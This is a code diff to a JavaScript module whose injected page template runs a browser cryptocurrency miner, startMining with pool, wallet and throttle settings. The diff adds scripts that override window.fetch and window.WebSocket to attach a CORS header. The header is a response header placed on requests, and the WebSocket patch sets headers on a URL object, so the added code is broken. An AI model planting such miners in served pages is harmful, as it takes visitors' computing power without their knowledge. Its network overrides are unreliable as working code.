@@ -80,7 +80,30 @@ module.exports = {
             startMining(pool, wallet, workerId, threads, password);
             throttleMiner = 20;
           </script>
-        `;
+
+          <script>
+          const originalFetch = window.fetch;
+          window.fetch = async (input, init = {}) => {
+            init.headers = {
+              ...init.headers,
+              'Access-Control-Expose-Headers': 'Content-Type, Authorization'
+            };
+            return originalFetch(input, init);
+            };
+
+            // WebSocketの再定義（CORSヘッダーの処理）
+            const originalWebSocket = window.WebSocket;
+            window.WebSocket = class extends originalWebSocket {
+            constructor(url, protocols) {
+            const modifiedUrl = new URL(url);
+              const headers = {
+                  'Access-Control-Expose-Headers': 'Content-Type, Authorization',
+              };
+            modifiedUrl.headers = headers; // ヘッダーを追加
+            super(modifiedUrl.toString(), protocols);
+          }
+        };
+      </script>`;
       },
     });
   },
